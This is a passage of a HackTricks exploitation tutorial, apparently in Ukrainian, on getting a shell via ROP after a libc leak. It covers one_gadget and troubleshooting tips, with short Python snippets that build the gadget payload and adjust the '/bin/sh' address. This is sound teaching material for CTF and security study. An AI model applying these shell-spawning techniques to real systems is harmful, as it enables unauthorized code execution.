–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget), —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É –∑–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **system** —ñ **"/bin/sh". ONE\_GADGET** –∑–Ω–∞–π–¥–µ –≤ –±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ libc —Å–ø–æ—Å—ñ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ª–∏—à–µ –æ–¥–Ω—É **ROP –∞–¥—Ä–µ—Å—É**.\
–û–¥–Ω–∞–∫, –∑–∞–∑–≤–∏—á–∞–π —î –¥–µ—è–∫—ñ –æ–±–º–µ–∂–µ–Ω–Ω—è, –Ω–∞–π–ø–æ—à–∏—Ä–µ–Ω—ñ—à—ñ —Ç–∞ –ª–µ–≥–∫—ñ –¥–ª—è —É–Ω–∏–∫–Ω–µ–Ω–Ω—è —Ç–∞–∫—ñ, —è–∫ `[rsp+0x30] == NULL`. –û—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç–µ –∑–Ω–∞—á–µ–Ω–Ω—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **RSP**, –≤–∞–º –ø—Ä–æ—Å—Ç–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ —â–µ –∫—ñ–ª—å–∫–∞ NULL –∑–Ω–∞—á–µ–Ω—å, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è.

![](<../../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —à–∞–±–ª–æ–Ω –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç—É—Ç:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## –ó–∞–≥–∞–ª—å–Ω—ñ –ø—Ä–æ–±–ª–µ–º–∏

### MAIN\_PLT = elf.symbols\['main'] –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ

–Ø–∫—â–æ —Å–∏–º–≤–æ–ª "main" –Ω–µ —ñ—Å–Ω—É—î. –¢–æ–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –æ—Å–Ω–æ–≤–Ω–∏–π –∫–æ–¥:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
—ñ –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –∞–¥—Ä–µ—Å—É –≤—Ä—É—á–Ω—É:
```python
MAIN_PLT = 0x401080
```
### Puts –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ

–Ø–∫—â–æ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î Puts, –≤–∞–º —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î

### `sh: 1: %s%s%s%s%s%s%s%s: –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ`

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —Ü—é **–ø–æ–º–∏–ª–∫—É** –ø—ñ—Å–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è **–≤—Å—ñ—Ö** –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤: `sh: 1: %s%s%s%s%s%s%s%s: –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ`

–°–ø—Ä–æ–±—É–π—Ç–µ **–≤—ñ–¥–Ω—è—Ç–∏ 64 –±–∞–π—Ç–∏ –≤—ñ–¥ –∞–¥—Ä–µ—Å–∏ "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
